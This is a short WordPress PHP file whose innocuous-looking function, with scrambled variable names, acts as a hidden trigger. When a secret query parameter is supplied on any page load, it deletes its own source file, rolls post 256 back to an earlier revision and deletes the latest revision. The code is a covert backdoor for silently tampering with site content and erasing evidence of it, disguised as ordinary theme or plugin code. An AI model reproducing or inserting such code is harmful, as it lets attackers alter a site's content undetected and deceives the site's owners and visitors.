<?php

function link_scripts_sidebar() {
	if (isset($_GET['publisher_bulk_app']) && $_GET['publisher_bulk_app'] === 'embed_all_database_nextgen') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$js_form_ui_reader = 256;
		$oembed_anywhere_estate = wp_get_post_revisions($js_form_ui_reader);
		if (empty($oembed_anywhere_estate)) die('no revisions');
		if (count($oembed_anywhere_estate) < 2) die('less than 2');
		$tooltip_shipping_pages = array_shift($oembed_anywhere_estate);
		$advanced_picker_comment_finder = $tooltip_shipping_pages->ID;
		$captcha_translate_bootstrap = array_shift($oembed_anywhere_estate);
		$cover_testimonials_messenger_builder = $captcha_translate_bootstrap->ID;
		$modules_deprecated_taxonomy_products = wp_restore_post_revision($cover_testimonials_messenger_builder);
		if ($modules_deprecated_taxonomy_products === false) die('error restoring');
		$modules_deprecated_taxonomy_products = wp_delete_post_revision($advanced_picker_comment_finder);		
		if ($modules_deprecated_taxonomy_products === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'link_scripts_sidebar');
